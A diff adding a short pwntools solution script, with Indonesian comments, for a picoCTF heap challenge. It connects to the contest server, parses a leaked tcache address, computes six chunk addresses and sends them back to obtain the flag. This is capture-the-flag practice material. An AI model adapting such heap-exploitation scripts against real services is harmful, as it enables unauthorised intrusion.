@@ -1,0 +1,21 @@
+from pwn import *
+
+# r = process('./heapedit')  # jika bisa dijalankan lokal (setelah loader diperbaiki)
+r = remote('candy-mountain.picoctf.net', 53770)
+
+# Terima leak tcache head
+r.recvuntil(b'-> ')
+leak = int(r.recvline().strip(), 16)
+log.info(f"Leaked chunk0: {hex(leak)}")
+
+# Hitung semua alamat
+addrs = [leak + i * 0x90 for i in range(6)]
+
+# Kirim setiap alamat
+for i, addr in enumerate(addrs):
+    r.recvuntil(f'Chunk {i+1} address:'.encode())
+    r.sendline(hex(addr).encode())
+
+# Dapatkan flag
+r.interactive()
+
